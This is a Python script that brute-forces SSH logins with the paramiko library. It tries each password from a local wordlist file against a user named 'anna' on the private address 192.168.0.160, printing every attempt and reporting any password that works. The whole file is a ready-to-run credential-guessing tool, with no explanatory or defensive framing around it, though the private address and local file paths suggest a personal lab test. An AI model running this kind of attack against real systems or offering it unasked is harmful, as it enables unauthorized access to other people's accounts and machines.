import paramiko
import socket
import time

def ssh_bruteforce(host, port, username, password_list, timeout=5):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            print(f"[+] Trying {username}:{password.strip()}")
            client.connect(hostname=host, port=port, username=username, password=password.strip(), timeout=timeout)
            print(f"[!] Success! Password found: {password.strip()}")
            client.close()
            return password.strip()
        except paramiko.AuthenticationException:
            continue
        except (paramiko.SSHException, socket.error) as e:
            print(f"[!] Connection error: {e}")
            time.sleep(1)
            continue
    print("[-] Password not found.")
    return None

if __name__ == "__main__":
    target_host = "192.168.0.160"
    target_port = 22
    username = "anna"

    with open("C:/Users/annar/Desktop/password.txt", "r") as f:
        passwords = f.readlines()



    found = ssh_bruteforce(target_host, target_port, username, passwords)
    if found:
        print(f"[+] Credentials: {username}:{found}")
    else:
        print("[-] No valid credentials found.")
